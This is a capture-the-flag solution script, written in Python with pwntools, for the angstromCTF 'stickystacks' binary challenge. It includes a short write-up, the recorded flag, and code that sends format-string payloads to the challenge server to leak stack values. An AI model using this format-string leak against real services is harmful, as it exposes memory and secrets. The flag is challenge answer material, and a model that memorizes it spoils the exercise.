#!/usr/bin/env python3

from pwn import *

exe = ELF("stickystacks")

context.binary = exe
context.log_level = 'debug'

############################ Write-Up #############################
# Challenge: stickstacks
# Category: Binary
# Points: 90
# Description: I made a program that holds a lot of secrets... maybe even a flag! Connect with nc shell.actf.co 21820, or visit /problems/2021/stickystacks on the shell server.
# Author: JoshDaBosh
# Hint: Is that what printf is for?
#
# Not going to much in detail, but the gist is that you leak stack
# values using the format string exploit. In this case you can get
# the flag through using pointer representations.
#
# Flag: actf{well_i'm_back_in_black_yes_i'm_back_in_the_stack_bec9b51294ead77684a1f593}
# Solved by: Ryan Nguyen

def conn():
	if False:
		return process([exe.path])
	else:
		return remote("shell.actf.co", 21820)


def main():
	for i in range(10):
		r = conn()
		r.recvuntil("Name:")
		r.sendline("%"+str(i+33)+"$p")
		r.recvline()
		out = r.recvline()
		print(out)


if __name__ == "__main__":
	main()
